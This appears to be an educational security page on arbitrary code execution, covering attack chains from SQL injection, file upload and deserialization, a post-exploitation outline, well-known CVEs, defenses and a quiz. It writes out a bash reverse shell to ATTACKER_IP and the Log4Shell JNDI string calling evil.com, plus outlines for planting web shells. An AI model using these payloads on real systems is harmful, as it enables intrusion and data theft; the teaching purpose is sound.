Arbitrary Code
Execution

aka ACE — when you can run whatever code you want on someone else's machine.
The highest note on the vulnerability scale.

"if they get here, the game is over." — every SOC analyst ever
Chapter 01 // Definition

💀 What does "arbitrary" even mean here?

Arbitrary = "anything the attacker chooses." Not a predefined set of commands. Not a limited sandbox. Any code.

📝 In human language

Arbitrary Code Execution means an attacker can run their OWN program code on YOUR computer or server — as if they were sitting at the keyboard.

Read files. Delete files. Install software. Mine crypto. Pivot to the internal network. Steal everything. Leave a backdoor so they can come back tomorrow.

If a vulnerability leads to ACE, it's usually rated CRITICAL. No exceptions.

ACE vs RCE — what's the difference?

💻 ACE (Arbitrary Code Execution)

The generic term. You can run arbitrary code somewhere. Could be local (you already have a user account on the machine and you escalate). Could be remote. Could be in a browser tab.

🌐 RCE (Remote Code Execution)

ACE but over the network. You don't need physical access or a prior account. You hit an HTTP endpoint with a malicious payload and BOOM — your shell pops on their server. RCE is the scariest. Nation-states pay millions for working RCEs.

Chapter 02 // The climb

🪜 How attackers get to ACE

ACE almost never comes from a single bug. It's a chain. A ladder of smaller vulnerabilities stacked until you're on top.

Common ladders to ACE

// Ladder #1: from SQLi → full server takeover 1. Find SQL injection in a search form 2. Dump database creds via UNION attack 3. Discover database has xp_cmdshell enabled (MSSQL) or INTO OUTFILE (MySQL) 4. Write a web shell to the server's web root 5. 🎉 Run arbitrary OS commands. You own the server. // Ladder #2: from file upload → RCE 1. Upload form lets you upload images 2. It doesn't check file contents, only extension 3. Upload evil.php renamed to evil.jpg then use path traversal 4. Hit https://target.com/uploads/evil.php 5. 🎉 Your PHP runs on their server. // Ladder #3: from deserialization → instant RCE 1. App accepts a serialized object (Java, Python pickle, PHP unserialize) 2. You craft a malicious "gadget chain" that executes code on deserialize 3. 🎉 Instant RCE, often pre-auth. Log4Shell was in this family.
🧠 Brain Power
Why is SQL injection sometimes a path to ACE? Isn't SQLi "just" about databases?

Because many databases have features that let you interact with the operating system:

  • MSSQL's xp_cmdshell — literally runs OS commands from inside SQL.
  • MySQL's INTO OUTFILE — writes query results to files on the server's disk. Write a web shell, access it via HTTP.
  • PostgreSQL's COPY ... FROM PROGRAM — executes a program and reads its output.
  • Oracle's Java / PL/SQL stored procs — can invoke OS functionality.

If SQLi gives you access to one of these, you've escalated from "read the database" to "execute OS commands." That's ACE. 🎯

what they do once they're in
Chapter 03 // After they pop the shell

🦹 "I have ACE. Now what?"

Running one command is nice. Staying forever is better. Here's the post-exploitation playbook.

🐚 1. Pop a reverse shell

Single command execution is clunky. Upgrade to an interactive shell by making the target connect back to YOUR machine.

# Classic bash reverse shell bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

🔓 2. Privilege escalation

You probably landed as a low-privileged user (like www-data). Time to become root / SYSTEM. Look for SUID binaries, kernel exploits, weak sudoers.

🪤 3. Persistence

Plant a backdoor so you can return even if they patch the original vuln. Cron jobs, SSH keys, malicious services, implants.

🌐 4. Lateral movement

The server you pwned is inside their network. Pivot to other machines, scan internal subnets, hit the domain controller. Ransomware crews LOVE this stage.

📦 5. Data exfiltration

Steal the crown jewels: customer database, source code, employee records, financial data. Copy it out slowly to avoid detection.

💰 6. Monetize

Ransomware? Cryptomining? Sell access on darkweb markets? The incentive economy decides the damage level.

real incidents
Chapter 04 // Legendary ACEs

🏛️ ACE bugs that rocked the world

CVE-2021-44228

☄️ Log4Shell (2021)

A single log message like ${jndi:ldap://evil.com/x} gave you RCE on hundreds of millions of Java apps. Internet-wide panic. Weeks of patching. Still being exploited years later.

CVE-2014-6271

🐚 Shellshock (2014)

A bug in Bash itself. Every web server using CGI scripts — exposed. Pre-auth RCE via HTTP headers. 25+ year old bug, found in 2014. 💀

CVE-2019-19781

🔐 Citrix ADC / NetScaler (2019)

Path traversal + template injection → unauthenticated RCE on VPN boxes. Nation-state groups burned this hard against enterprises.

CVE-2017-5638

🏦 Apache Struts / Equifax (2017)

RCE in Apache Struts. Equifax didn't patch. 147 million Americans had their SSNs, birthdays, and credit histories stolen. $1.4B+ in damages.

CVE-2021-26855

📧 ProxyLogon (2021)

Pre-auth RCE on Exchange Server. Chinese APT groups mass-exploited tens of thousands of orgs before Microsoft could patch. Chaos.

CVE-2014-0160

❤️ Heartbleed (2014)

Technically info disclosure, not ACE — but the memory leaks gave attackers session keys and creds that led to ACE on millions of servers running OpenSSL.

💡 Pattern spotting: Most mega-ACE bugs aren't found in random places — they're found in foundational libraries and frameworks (Log4j, Bash, OpenSSL, Struts). Because those are embedded in millions of apps, one bug = internet-wide impact.
Chapter 05 // Defending against ACE

🛡️ There is no single fix. Defense is layered.

  • Patch, patch, patch. Most ACE breaches happen from known CVEs left unpatched for months. Set up automated patching.
  • Input validation everywhere. Don't trust ANY input — URL, form, header, cookie, API body.
  • Use parameterized queries to kill SQLi-to-ACE chains.
  • Run services as the least-privileged user. If your webserver runs as root, an ACE = instant full box ownership. If it runs as www-data, the attacker still has to escalate.
  • Sandbox / containerize — Docker, chroot, SELinux, AppArmor. Compartments limit blast radius.
  • WAF (web application firewall) — catches obvious payloads. Not a fix, but slows down mass scanners.
  • Monitor + alert — if a process spawns /bin/sh when it shouldn't, your EDR should scream.
  • Egress filtering — block outbound connections from servers that shouldn't be initiating them. Stops reverse shells cold.

🎯 Check Yourself

An attacker gets RCE on a company's web server. The webserver runs as the nobody user and is inside a Docker container. What can they STILL do?
Nothing — the container fully protects the rest of the system.
Plenty — read the app's config (including DB creds), attack internal services, try to escape the container, pivot if network allows.
They have to wait for a root escalation before doing anything useful.
They can only run commands, not read files.
